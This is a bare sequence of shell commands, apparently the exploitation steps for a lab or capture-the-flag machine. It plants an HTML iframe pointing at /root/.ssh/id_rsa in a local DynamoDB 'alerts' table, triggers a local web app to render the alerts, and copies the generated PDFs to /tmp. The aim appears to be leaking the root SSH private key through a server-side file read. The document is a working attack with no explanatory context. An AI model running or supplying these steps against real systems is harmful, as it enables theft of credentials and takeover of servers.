/bin/mkdir /tmp/parrotguy
/usr/bin/aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --endpoint-url http://localhost:4566 --region us-east-1 --no-sign-request
/usr/bin/aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<iframe src=\"file:/root/.ssh/id_rsa\"/>"}}' --endpoint-url http://localhost:4566 --region us-east-1 --no-sign-request
/usr/bin/aws dynamodb scan --table-name alerts --filter-expression "title = :title" --expression-attribute-values '{":title":{"S":"Ransomware"}}' --endpoint-url http://localhost:4566 --region us-east-1 --no-sign-request
/bin/curl -X POST -F 'action=get_alerts' 127.0.0.1:8000
/bin/curl 127.0.0.1:8000/files/$(ls ./files | grep "html")
cp ./files/*.pdf /tmp/parrotguy
